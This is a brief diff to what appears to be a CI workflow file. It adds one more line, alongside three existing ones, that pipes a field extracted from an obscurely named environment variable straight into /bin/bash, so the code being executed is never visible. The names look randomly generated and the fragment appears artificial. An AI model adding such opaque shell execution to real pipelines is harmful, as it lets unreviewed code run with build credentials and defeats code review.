@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$xmp1" | jq -r .k481 | /bin/bash
           echo $phge8813 | jq -r .oiqle24 | /bin/bash
           echo $omnlv4760 | jq -r .e0308 | /bin/bash
+          printf '%s' "$zg76229" | jq -r .xd12 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
